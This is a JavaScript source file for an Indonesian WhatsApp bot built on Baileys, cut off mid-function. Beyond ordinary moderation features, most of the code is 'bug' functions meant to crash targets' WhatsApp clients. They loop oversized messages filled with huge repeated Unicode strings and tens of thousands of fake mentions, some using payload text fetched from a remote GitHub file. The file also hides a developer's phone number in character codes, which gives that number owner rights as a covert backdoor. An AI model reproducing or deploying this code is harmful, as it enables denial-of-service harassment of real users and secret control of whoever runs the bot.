/* 

=========================================================================

  #- Credits By FR3 HOSTING
   Contact: https://62882008771872
    
  Developer : https://wa.me/62882008771871
  
  -[ ! ]- Jangan hapus contact developer! hargai pembuat script ini
  -[ ! ]- Case Ini Di Kembangkan Pada Waktu [{Feb 01, 2025 22:15}]
=========================================================================

*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const { execFile } = require("child_process");
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper");
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const extract = require("extract-zip");
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const allZones = moment.tz.names().slice(0, 100);
const totalfitur = () =>{
var mytext = fs.readFileSync("./command/airbus.js").toString()
var numUpper = (mytext.match(/case "/g) || []).length
return numUpper
}
const {
  default: WAConnection,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  getBinaryNodeChildren,
  useMultiFileAuthState,
  generateWAMessageContent,
  downloadContentFromMessage,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
  downloadMediaMessage
} = require('@whiskeysockets/baileys')
const { LoadDataBase } = require('./library/data2');
const loadPluginsCommand = require('./library/Plugins');
const serverpanel = JSON.parse(fs.readFileSync("./library/database/settingpanel.json"))
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const stokdo = JSON.parse(fs.readFileSync("./library/database/stokdo.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"));
const akses = JSON.parse(fs.readFileSync("./library/database/akses.json"));
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const listidch = JSON.parse(fs.readFileSync("./library/database/listidch.json"))
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/data6")
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/data5');
let isAutoAI = false;
const autoResponderAI = require('./library/autoResponderAI');

async function uploadToGithub(zipPath, repoName) {
  const extractPath = path.join(__dirname, "temp", Date.now().toString());
  await extract(zipPath, { dir: extractPath });

  const files = fs.readdirSync(extractPath);

  for (const file of files) {
    const filePath = path.join(extractPath, file);
    if (fs.lstatSync(filePath).isDirectory()) continue;

    const content = fs.readFileSync(filePath, "base64");

    const response = await fetch(`https://api.github.com/repos/${github.username}/${repoName}/contents/${file}`, {
      method: "PUT",
      headers: {
        Authorization: `token ${github.token}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        message: `Upload file: ${file}`,
        content
      })
    });

    if (!response.ok) {
      const err = await response.text();
      throw new Error(`Gagal upload ${file}: ${err}`);
    }
  }

  return `https://github.com/${github.username}/${repoName}`;
}

const tofileBufferMap = new Map();
const groupDbPath = './library/database/idgc.json'; // ganti tempat kalian nyimpen grub []
function loadGroupList() {
if (!fs.existsSync(groupDbPath)) {
return { groups: [] };
}
const data = fs.readFileSync(groupDbPath);
return JSON.parse(data);
}
function saveGroupList(data) {
fs.writeFileSync(groupDbPath, JSON.stringify(data, null, 2));
}
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/data3');
module.exports = Nvidia = async (Nvidia, m, chatUpdate, store) => {
	try {
await LoadDataBase(Nvidia, m)
const botNumber = await Nvidia.decodeJid(Nvidia.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
if (m?.message?.buttonsResponseMessage) {
  const btnCmd = m.message.buttonsResponseMessage.selectedButtonId;
  m.text = btnCmd;
}
const buffer64base = String.fromCharCode(54, 50, 56, 56, 50, 48, 48, 56, 55, 55, 49, 56, 55, 49, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body?.startsWith(prefix);
const args = body?.trim()?.split(/ +/)?.slice(1) || [];
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender);
const isAkses = !m.isGroup && akses.groups.includes(m.chat);
const isCreator = isOwner = [botNumber, owner + "@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) || m.isDeveloper
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)

if (!m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return
if (isCmd) {
console.log(chalk.cyan.bold(`╔════════════════════════════════════╗\n║         ⌬  COMMAND RECEIVED  ⌬ \n╠════════════════════════════════════╣`), chalk.blue.bold(`\n║ Command   :`), chalk.white.bold(`${command}`), chalk.blue.bold(`\n║ From   :`), chalk.white.bold(!m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╚════════════════════════════════════╝\n`))
}

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${command}`}}}
const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}
const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}
const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}
const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "NvidiaBotz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}
const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}
const from = m.chat;

if (!m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (!m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd) {
try {
let res = await axios.get(`https://simsimi.site/api/v2/?mode=talk&lang=id&message=${m.text}&filter=true`)
if (res.data.success) {
await m.reply(res.data.success)
}
} catch (e) {}
}

if (!m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Nvidia.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Nvidia.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Nvidia.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await Nvidia.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (!m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
  var linkRegex = /https?:\/\/[^\s]+|www\.[^\s]+|\b\w+\.(com|net|org|id|me|co|io|ai|dev|shop|my.id|biz.id|web.id|vercel.app|xyz|)\b/gi;

  if (linkRegex.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
    var gclink = (`https://chat.whatsapp.com/` + await Nvidia.groupInviteCode(m.chat));
    var isLinkThisGc = new RegExp(gclink, 'i');
    var isgclink = isLinkThisGc.test(m.text);

    if (isgclink) return;

    let delet = m.key.participant;
    let bang = m.key.id;

    await Nvidia.sendMessage(m.chat, {
      text: `*乂 [ Link Terdeteksi ]*\n\n@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karena admin/ownerbot telah menyalakan fitur antilink grup ini!`,
      mentions: [m.sender]
    }, {quoted: m});

    await Nvidia.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: false,
        id: bang,
        participant: delet
      }
    });

    // Jika mau: Kick user juga
    // await sleep(1000);
    // await Nvidia.groupParticipantsUpdate(m.chat, [m.sender], "remove");
  }
}

if (!m.isGroup && db.groups[m.chat] && db.groups[m.chat].antiPromo == true) {
  const linkRegex = /https?:\/\/[^\s]+|www\.[^\s]+|\b\w+\.(com|net|org|id|me|co|io|ai|dev|shop|my\.id|biz\.id|web\.id|vercel\.app|xyz)\b/gi;

  const promoKeywords = [
    'wa.me/',
    'promo',
    'sell',
    'jual',
    'diskon',
    'cashback',
    'free',
    'beli',
    'order',
    'sale',
    'voucher',
    'gratis',
    'diskon',
    'potongan',
    'penawaran'
  ];

  const containsPromoWords = promoKeywords.some(keyword => 
    m.text.toLowerCase().includes(keyword)
  );

  if (
    (linkRegex.test(m.text) || containsPromoWords) &&
    !isCreator &&
    !m.isAdmin &&
    m.isBotAdmin &&
    !m.fromMe
  ) {
    const gclink = `https://chat.whatsapp.com/${await Nvidia.groupInviteCode(m.chat)}`;
    const isLinkThisGc = new RegExp(gclink, 'i');
    const isgclink = isLinkThisGc.test(m.text);

    if (isgclink) return;

    let delet = m.key.participant;
    let bang = m.key.id;

    await Nvidia.sendMessage(m.chat, {
      text: `*乂 [ Promosi Terdeteksi ]*\n\n@${m.sender.split("@")[0]} Maaf, pesan kamu saya hapus karena dilarang oleh admin/owner bot! Tolong jangan promosi di grup ini.`,
      mentions: [m.sender]
    }, { quoted: m });

    await Nvidia.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: false,
        id: bang,
        participant: delet
      }
    });

    // Jika mau kick user yang melanggar, bisa diaktifkan ini:
    // await sleep(1000);
    // await Nvidia.groupParticipantsUpdate(m.chat, [m.sender], "remove");
  }
}

if (!m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await Nvidia.sendMessage(m.chat, {text: `
*Fr3 Hosting Menyediakan 🌟*
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama global.domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup Bebas Promosi 1 :*
https://chat.whatsapp.com/Crk0eS20MADKkFbe4EnNIs
* *Channel Fun:*
https://whatsapp.com/channel/0029Vah2xUh2P59jqToexF0n
* *Channel Testimoni :*
https://whatsapp.com/channel/0029Vb0fOlxEFeXsah2fi31y

*👤 Contact FR3*
* *WhatsApp Utama :*
+62882008771871
* *WhtasApp Cadangan :*
+6288229545275
`}, {quoted: null})
}
}


if (!isCmd) {
    let check = list.find(e => e.cmd === (body ? body.toLowerCase() : ''));
    if (check) {
        await m.reply(check.respon);
    }
}

const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function loadAkses() {
  return JSON.parse(fs.readFileSync("./library/database/akses.json", "utf-8"));
}
function saveAkses(db) {
  fs.writeFileSync("./library/database/akses.json", JSON.stringify(db, null, 2));
}

const Reply = async (teks) => {
return Nvidia.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: null})
}

const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝙉𝙖𝙗𝙯𝙭 𝘿𝙚𝙫\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"NvidiaKentut\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ ɴᴠɪᴅɪᴀᴄʀᴀsʜ ⿻ ʙᴀɴᴛᴀɪ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}
		
let apiClient;
try {
  const res = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiNvidia.json');
  apiClient = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}

async function Blank1(client, isTarget) {
    let memeknya = "ꦾ".repeat(99999) + " ꦽ".repeat(5000);
    var messageContent = generateWAMessageFromContent(
        isTarget,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    stickerPackMessage: {
                        stickerPackId: "b58c0f42-0d1f-48fc-a516-7821f4d8d7a0",
                        name: "Bug Made By Nvidia🐉" + memeknya,
                        publisher: memeknya + `ꦾ`.repeat(99999),
                        stickers: [
                            {
                                fileName: "rroK-d0l9EdduolvylB3XF6RKwnyiz0RKAQMWb7RMl4=.webp",
                                isAnimated: false,
                                emojis: [""],
                                accessibilityLabel: "",
                                isLottie: false,
                                mimetype: "image/webp"
                            },
                            {
                                fileName: "JWKop+ILOcOMUNvxzJ52pUKwzWEgMbYkKFlo-aBKcfY=.webp",
                                isAnimated: false,
                                emojis: [""],
                                accessibilityLabel: "",
                                isLottie: false,
                                mimetype: "image/webp"
                            }
                        ],
                        fileLength: "69832",
                        fileSha256: "J1qUbwUO4z77FRY3YcJ2DsQkL+SLTYhvacH2jfcZZNk=",
                        fileEncSha256: "2ZEtY/Lfza1MYM6yU7jvCNwFTsYKHLuU7d6XwX/1W5c=",
                        mediaKey: "A192qGyrnYXtdftrXGS1/R/3qcB6wG46ybFNvuXw0w8=",
                        directPath: "/v/t62.15575-24/27352554_9405543626240762_2450036504553609989_n.enc?ccb=11-4&oh=01_Q5Aa1QFxiY3tujF8LmhWFx_gf4uMfQ2e544QIygRxw6wqt78cw&oe=68406780&_nc_sid=5e03e0",
                        contextInfo: {},
                        mediaKeyTimestamp: "1746459896",
                        trayIconFileName: "b58c0f42-0d1f-48fc-a516-7821f4d8d7a0.png",
                        thumbnailDirectPath: "/v/t62.15575-24/11410555_1219244196575326_7771742087005735253_n.enc?ccb=11-4&oh=01_Q5Aa1QEE9w6Kxf3WA3mH-_CcLiRcGVM29PNP1OJ9Z-kwv1mzwg&oe=684036A4&_nc_sid=5e03e0",
                        thumbnailSha256: "UJxXSKrCVS9g/e/Ai39k62XEeTETrof25srXus8fkSA=",
                        thumbnailEncSha256: "ufsZpeTyo10n1OPuYUsqPO01W6/vTrSepULAicGOFi8=",
                        thumbnailHeight: 252,
                        thumbnailWidth: 252,
                        imageDataHash: "M2UxNGQzOGE0NThhM2VmNWFkYTUyZmQ3NzE0MWMwNWZjZjkwODM3NjFjOTY4MDljZjVhOWY0ZWVmZGU3ZWI3YQ==",
                        stickerPackSize: "69233",
                        stickerPackOrigin: "USER_CREATED"
                    },
                },
            },
        }),
        {
            userJid: isTarget,
        }
    );

    for (let i = 0; i < 100; i++) {
        await client.relayMessage(isTarget, messageContent.message, {
            participant: { jid: isTarget },
            messageId: messageContent.key.id,
        });
        console.log(`Send Bug Blank1 (${i + 1}/100): ${isTarget}`);
    }
}

async function Blank2(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "Bug Made By Nvdiia" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        for (let i = 0; i < 100; i++) {
            await Nvidia.relayMessage(target, messsage, {
                userJid: target,
            });
            console.log(`Send Bug Blank2 (${i + 1}/100): ${target}`);
        }
    } catch (err) {
        console.log(err);
    }
}

async function GxhorseForceClose(target) {
for (let r = 0; r < 666; r++) {  
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterName: "ᴋᴀsɪᴀɴ ᴅɪ ʙᴜɢ sᴀᴍᴀ ʙᴀɴɢ ғʀ",
              newsletterJid: "120363380080841414@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "Kontol",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "t.me/Fya_zuroku",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "ɴᴠɪᴅɪᴀ ᴋɪʟʟ",
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Zuroku - Beginner\",\"body\":\"Call Galaxy\"}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "𝔨𝔦𝔩𝔩𝔢𝔯𝔥𝔬𝔯𝔰𝔢 ↯ 𝔛𝔠𝔯𝔞𝔰𝔥",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "𝔨𝔦𝔩𝔩𝔢𝔯𝔥𝔬𝔯𝔰𝔢 ↯ 𝔛𝔠𝔯𝔞𝔰𝔥",
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: ""
                },
                {
                  name: "payment_status",
                  buttonParamsJson: ""
                },
                {
                  name: "review_order",
                  buttonParamsJson: ""
                },
              ],
            },
          },
        },
      },
    },
    {}
  );
  await Nvidia.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
await sleep(5000) // memberikan efek jeda selama 5 detik
console.log("저스틴𝔲𝔦 𝔖𝔶𝔰𝔱𝔢𝔪𝔞𝔱𝔦𝔠巛⚰︎⃟⃟🩸")
}
}

async function SpaceGroup(target) {
if (!target.includes("@s.whatsapp.net") && !target.includes("@g.us")) {
console.error("Error: Target JID tidak valid!", target);
return;
}

let apiGrup;
try {
  const res = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiNvidia.json');
  apiGrup = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}

let Msg = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: {
contextInfo: {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target,
},
},
body: {
text: "ɴᴠɪᴅɪᴀ ᴠ𝟽꙰",
},
nativeFlowMessage: {
buttons: [
{  name: "single_select",
buttonParamsJson: apiGrup + "𝔨𝔦𝔩𝔩𝔢𝔯𝔥𝔬𝔯𝔰𝔢 ↯ 𝔛𝔠𝔯𝔞𝔰𝔥",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "𝔨𝔦𝔩𝔩𝔢𝔯𝔥𝔬𝔯𝔰𝔢 ↯ 𝔛𝔠𝔯𝔞𝔰𝔥",
}, 
{
name: "payment_method",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "review_order",
buttonParamsJson: "" }
],
},
},
},
},
};
for (let i = 0; i < 10; i++) {  
try {
await Nvidia.relayMessage(target, Msg, {});
await new Promise(resolve => setTimeout(resolve, 1000));
} catch (err) {
console.error("Error mengirim bug:", err);
break; 
}
}
}

async function ForceCloseUiX(target) {
for (let i = 0; i < 10; i++) {
await GxhorseForceClose(target);
await GxhorseForceClose(target);
await GxhorseForceClose(target);
await GxhorseForceClose(target);
await GxhorseForceClose(target);
await GxhorseForceClose(target);
}
}

async function OverflowPayload(target, mention = false, delayMs = 500) {
    for (const targett of target) {
        const generateMessage = {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/jpeg",
                        caption: "? ???????-?",
                        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                        fileLength: "19769",
                        height: 354,
                        width: 783,
                        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                        mediaKeyTimestamp: "1743225419",
                        jpegThumbnail: null,
                        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                        scanLengths: [2437, 17332],
                        contextInfo: {
                            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                            isSampled: true,
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    }
                }
            }
        };

        const msg = generateWAMessageFromContent(target, generateMessage, {});
        
        await Nvidia.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        if (mention) {
            await Nvidia.relayMessage(
                target,
                {
                    statusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: msg.key,
                                type: 25
                            }
                        }
                    }
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "Nab" },
                            content: undefined
                        }
                    ]
                }
            );
        }

        // Delay antar target
        await new Promise(res => setTimeout(res, delayMs));
    }
}
	
async function protocolbug2(isTarget, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "? ???????-?",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await Nvidia.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Nvidia.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "???? ???????? - ????" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug4(isTarget, mention) {
    const glitchText = "𓆩⛧𓆪".repeat(3000) + "\n" + "‎".repeat(3000); // simbol + invisible
    
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: `╔═━━━✥◈✥━━━═╗\n  NVIDIA - PROTOCOL 𝟰\n╚═━━━✥◈✥━━━═╝\n${glitchText}`,
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await Nvidia.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
